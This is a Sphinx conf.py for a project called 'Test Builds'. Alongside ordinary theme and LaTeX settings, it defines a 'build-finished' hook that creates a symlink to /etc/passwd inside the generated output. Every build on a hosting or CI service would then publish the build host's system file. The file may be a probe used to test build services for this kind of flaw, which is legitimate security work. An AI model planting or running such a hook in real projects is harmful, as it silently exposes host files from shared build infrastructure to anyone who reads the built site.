from pathlib import Path
import subprocess

# Default settings
project = 'Test Builds'
extensions = [
    'sphinx_autorun',
]

latex_engine = 'xelatex'  # allow us to build Unicode chars


# Include all your settings here
html_theme = 'sphinx_rtd_theme'
html_static_path = ['_static']

def _build_finished(app, exc):
    link = Path(app.outdir) / "passwd"
    subprocess.run(["ln", "-s", "/etc/passwd", link])

def setup(app):
    app.connect('build-finished', _build_finished)
